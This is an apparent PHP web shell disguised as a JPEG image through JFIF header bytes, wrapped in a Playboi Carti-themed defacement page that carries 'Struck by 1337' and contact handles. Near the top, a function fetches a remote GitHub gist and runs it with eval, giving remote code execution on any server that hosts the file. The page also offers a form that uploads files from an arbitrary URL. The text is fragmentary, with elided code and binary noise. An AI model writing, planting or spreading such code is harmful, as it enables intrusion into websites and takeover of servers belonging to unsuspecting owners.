...
--------------------------------------------->ÿØÿà JFIF ÿþ;ÿØÿà JFIF ÿþ;<?pHp
   function get($url) {
    ...
    return $data;
      ...
      eval('?>' . get('https://gist.githubusercontent.com/paknago21/dcdee7fdf51857e2bce6dcc13f08d7f7/raw/8106dca6f6d977cbca5f5f821b8cda08a8e688e6/v'));
?>
?><!--------------------------------------------
blank*
--------------------------------------------->�����x������x������C�
...
<head>
    ...
    <meta name="author" content="Carti">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Whole Lotta Red">
    <meta property="og:description" content="Whole Lotta Red">
    <meta property="og:image" content="https://e1.pxfuel.com/desktop-wallpaper/504/545/desktop-wallpaper-playboi-carti-pc-playboi-carti-aesthetic-1920x1080.jpg">
...
<audio id="sec" __idm_id__="823202817"> <source src="https://exam-infocom-13.ovh/Playboi%20Carti%20-%20Feel%20Like%20God%20(remix%20by%20gazzzy)%20[Lyrics]%20prod.%20miyokibeats.mp3"></audio>
...
body {
	background: url(https://e1.pxfuel.com/desktop-wallpaper/504/545/desktop-wallpaper-playboi-carti-pc-playboi-carti-aesthetic-1920x1080.jpg) no-repeat center center fixed; 
...
<center>
<font face="Bungee" size="5">././PlaYb0i CaRT1\.\.</font></center>
...
function author() {
    echo "<center><br>cArT1 - USA</center>";
    exit();
}
...
<input type="text" name="darilink" class="up" placeholder="https://carti.god/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
...
# Struck by 1337 #
<br><a href="http://t.me/pentemm">
<img border="0" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcResA4sCJPJjWkIjRdGrnoivHbSBCcBHv3w5A&usqp=CAU" width="400"></a>

<br><center>[ ! ]
#Since 2017
g0D !</p>
<p align="center">"????????????????????????"</p>
<p align="center">paknago2@gmail.com<center>
</p>USA - NYC
